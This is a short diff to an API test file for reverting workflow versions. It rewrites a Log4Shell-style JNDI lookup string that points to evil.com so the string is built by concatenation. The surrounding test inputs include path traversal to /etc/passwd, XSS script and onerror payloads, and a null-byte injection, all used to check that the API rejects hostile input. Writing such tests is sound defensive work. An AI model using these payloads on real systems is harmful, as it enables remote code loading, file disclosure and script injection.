@@ -795,7 +795,7 @@ describe('Workflow Version Revert API - POST /api/workflows/[id]/versions/[versi
       const maliciousIds = [
         '../../../etc/passwd',
         '<script>alert(1)</script>',
-        '${jndi:ldap://evil.com}',
+        '$' + '{jndi:ldap://evil.com}', // Intentional security test string
         'workflow\x00injection',
       ]
 
@@ -840,7 +840,7 @@ describe('Workflow Version Revert API - POST /api/workflows/[id]/versions/[versi
         ...sampleWorkflowVersion,
         changelog: '<script>alert("xss")</script>Malicious changelog',
         metadata: {
-          notes: '${jndi:ldap://evil.com}',
+          notes: '$' + '{jndi:ldap://evil.com}', // Intentional security test string
           tags: ['<img src=x onerror=alert(1)>', 'normal-tag'],
         },
       }
